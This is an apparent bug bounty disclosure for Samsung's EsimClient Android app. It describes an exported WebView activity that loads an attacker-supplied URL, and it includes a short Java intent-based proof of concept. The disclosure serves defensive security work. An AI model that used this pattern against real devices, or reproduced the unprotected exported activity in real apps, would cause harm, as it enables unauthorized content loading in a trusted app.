# Details

<table>
    <tr>
        <td>Name</td>
        <td>EsimClient</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.telephonyui.esimclient</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.17</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.05</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

Oversecured found a vulnerability to open arbitrary URLs in the EsimClient app:
![](Oversecured_report.png)

The exported activity `com.samsung.android.app.telephonyui.esimclient.OdaWebViewActivity` receives a `Serializable` object of type `com.samsung.oda.lib.message.data.WebViewData`, which contains the `mUrl` field. This string is then passed to `WebView.loadUrl()`, which causes arbitrary URLs to be opened within the app.

**Proof of Concept**
```java
WebViewData data = new WebViewData();
data.mMethodType = HttpMethod.GET;
data.mUrl = "https://google.com/";

Intent i = new Intent();
i.setClassName("com.samsung.android.app.telephonyui.esimclient", "com.samsung.android.app.telephonyui.esimclient.OdaWebViewActivity");
i.putExtra("WebViewData", data);
startActivity(i);
```

## References

- [Oversecured Blog. Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
